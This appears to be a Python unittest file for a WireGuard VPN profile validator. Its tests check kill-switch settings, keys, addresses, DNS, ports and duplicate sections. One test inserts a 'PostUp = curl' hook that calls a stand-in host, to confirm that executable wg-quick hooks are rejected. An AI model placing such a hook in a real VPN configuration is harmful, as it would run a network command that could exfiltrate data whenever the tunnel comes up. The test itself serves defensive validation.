import sys
import tempfile
import unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parents[1] / "src"))
from privacyflow.config import ConfigError, load_config, rotation_plan

PROFILE = """[Interface]\nPrivateKey = AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8=\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = ICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj8=\nEndpoint = vpn.example.net:51820\nAllowedIPs = 0.0.0.0/0, ::/0\n"""

class PrivacyflowConfigTests(unittest.TestCase):
    def setUp(self): self.temp = tempfile.TemporaryDirectory(); self.base = Path(self.temp.name)
    def tearDown(self): self.temp.cleanup()
    def make_config(self, kill=True, interval=300, profile=PROFILE):
        (self.base / "vpn.conf").write_text(profile)
        cfg = self.base / "veil.toml"
        cfg.write_text(f'profiles = ["vpn.conf"]\n[rotation]\ninterval_seconds={interval}\nrequire_kill_switch={"true" if kill else "false"}\n')
        return cfg
    def test_validates_profile_and_plan(self):
        cfg = load_config(self.make_config())
        self.assertEqual(len(rotation_plan(cfg)), 1)
        self.assertEqual(rotation_plan(cfg)[0]["action"], "would-switch-after-health-check")
    def test_rejects_disabled_kill_switch(self):
        with self.assertRaises(ConfigError): load_config(self.make_config(kill=False))
    def test_rejects_short_interval(self):
        with self.assertRaises(ConfigError): load_config(self.make_config(interval=5))
    def test_rejects_boolean_interval(self):
        with self.assertRaises(ConfigError): load_config(self.make_config(interval="true"))
    def test_rejects_missing_private_key(self):
        private_key = "AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8="
        cfg = self.make_config(profile=PROFILE.replace(f"PrivateKey = {private_key}\n", ""))
        with self.assertRaises(ConfigError): load_config(cfg)

    def test_rejects_invalid_wireguard_key_length(self):
        cfg = self.make_config(profile=PROFILE.replace("PrivateKey = ", "PrivateKey = not-a-key\n# ", 1))
        with self.assertRaises(ConfigError): load_config(cfg)

    def test_rejects_invalid_interface_address(self):
        cfg = self.make_config(profile=PROFILE.replace("10.0.0.2/32", "not-an-ip"))
        with self.assertRaises(ConfigError): load_config(cfg)

    def test_rejects_invalid_endpoint_port(self):
        cfg = self.make_config(profile=PROFILE.replace("vpn.example.net:51820", "vpn.example.net:99999"))
        with self.assertRaises(ConfigError): load_config(cfg)

    def test_rejects_non_table_rotation(self):
        (self.base / "vpn.conf").write_text(PROFILE)
        cfg = self.base / "bad.toml"
        cfg.write_text('profiles = ["vpn.conf"]\nrotation = 3\n')
        with self.assertRaisesRegex(ConfigError, "rotation must be a TOML table"):
            load_config(cfg)

    def test_rejects_duplicate_profiles(self):
        (self.base / "vpn.conf").write_text(PROFILE)
        cfg = self.base / "dupe.toml"
        cfg.write_text('profiles = ["vpn.conf", "./vpn.conf"]\n')
        with self.assertRaisesRegex(ConfigError, "duplicate paths"):
            load_config(cfg)

    def test_accepts_multiple_peer_sections(self):
        second_peer = "\n[Peer]\nPublicKey = ICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj8=\nEndpoint = vpn2.example.net:51821\nAllowedIPs = 10.20.0.0/16\n"
        cfg = self.make_config(profile=PROFILE + second_peer)
        self.assertEqual(len(load_config(cfg).profiles), 1)

    def test_rejects_duplicate_interface_section(self):
        cfg = self.make_config(profile=PROFILE + "\n[Interface]\nAddress = 10.0.0.3/32\n")
        with self.assertRaisesRegex(ConfigError, r"more than one \[Interface\]"):
            load_config(cfg)

    def test_rejects_duplicate_key_in_peer(self):
        cfg = self.make_config(profile=PROFILE.replace("Endpoint = vpn.example.net:51820", "Endpoint = vpn.example.net:51820\nEndpoint = vpn2.example.net:51820"))
        with self.assertRaisesRegex(ConfigError, "duplicate key"):
            load_config(cfg)

    def test_accepts_dns_search_domains_and_addresses(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nDNS = 1.1.1.1, corp.example.net")
        self.assertEqual(len(load_config(self.make_config(profile=profile)).profiles), 1)

    def test_rejects_invalid_dns_search_domain(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nDNS = bad_domain")
        with self.assertRaisesRegex(ConfigError, "invalid Interface.DNS"):
            load_config(self.make_config(profile=profile))

    def test_rejects_unknown_wireguard_directive(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nUnrecognisedOption = true")
        with self.assertRaisesRegex(ConfigError, "unsupported Interface.UnrecognisedOption"):
            load_config(self.make_config(profile=profile))

    def test_rejects_executable_wg_quick_hooks(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nPostUp = curl https://bad.example/secret")
        with self.assertRaisesRegex(ConfigError, "executable wg-quick hook"):
            load_config(self.make_config(profile=profile))

    def test_rejects_invalid_interface_mtu(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nMTU = 100000")
        with self.assertRaisesRegex(ConfigError, "Interface.MTU"):
            load_config(self.make_config(profile=profile))

    def test_rejects_invalid_save_config_boolean(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nSaveConfig = yes")
        with self.assertRaisesRegex(ConfigError, "SaveConfig"):
            load_config(self.make_config(profile=profile))

    def test_rejects_empty_preshared_key(self):
        profile = PROFILE.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 0.0.0.0/0, ::/0\nPresharedKey =")
        with self.assertRaisesRegex(ConfigError, "empty PresharedKey"):
            load_config(self.make_config(profile=profile))

    def test_rejects_profile_over_size_limit(self):
        profile_path = self.base / "large.conf"
        profile_path.write_text("#" + ("x" * (1024 * 1024)))
        cfg = self.base / "large.toml"
        cfg.write_text('profiles = ["large.conf"]\n')
        with self.assertRaisesRegex(ConfigError, "1 MiB safety limit"):
            load_config(cfg)

    def test_accepts_wireguard_listen_port_and_fwmark(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nListenPort = 51820\nFwMark = 0xca6c")
        self.assertEqual(len(load_config(self.make_config(profile=profile)).profiles), 1)

    def test_rejects_invalid_listen_port(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nListenPort = 70000")
        with self.assertRaisesRegex(ConfigError, "Interface.ListenPort"):
            load_config(self.make_config(profile=profile))

    def test_rejects_numeric_looking_invalid_dns_ip(self):
        profile = PROFILE.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nDNS = 999.999.999.999")
        with self.assertRaisesRegex(ConfigError, "invalid Interface.DNS"):
            load_config(self.make_config(profile=profile))


if __name__ == "__main__": unittest.main()
